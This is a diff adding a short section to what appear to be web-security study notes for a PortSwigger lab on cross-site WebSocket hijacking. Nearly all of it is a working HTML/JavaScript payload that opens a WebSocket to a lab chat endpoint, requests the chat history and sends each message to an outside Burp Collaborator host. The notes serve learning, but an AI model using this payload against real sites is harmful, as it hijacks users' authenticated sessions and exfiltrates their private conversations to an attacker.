@@ -21,4 +21,16 @@
 ```
 
 ### Cross-site WebSocket hijacking
-
+* First we need to check whether there is no CSRF token implenented when establishing WebSocket
+* Payload
+```html
+<script>
+  var ws = new WebSocket('wss://ac801f771ee6b866c05f4cd400ab0032.web-security-academy.net/chat');
+  ws.onopen = function() {
+    ws.send("READY");
+  };
+  ws.onmessage = function(event) {
+    fetch('https://s1u3ivhsytkn69c7b986lqfuslybm0.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body: event.data});
+  };
+</script> 
+```
